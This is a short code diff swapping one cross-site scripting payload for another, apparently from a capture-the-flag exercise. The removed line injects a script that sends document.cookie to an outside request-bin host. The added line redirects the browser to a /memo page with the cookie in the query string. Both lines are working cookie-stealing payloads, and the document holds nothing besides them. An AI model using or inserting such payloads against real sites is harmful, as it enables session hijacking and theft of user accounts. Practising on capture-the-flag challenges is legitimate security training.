@@ -1,2 +1,3 @@
-<script>fetch("https://rzhfjsl.request.dreamhack.games"+document.cookie)</script>;
+location.href="/memo?memo="+document.cookie
+
 
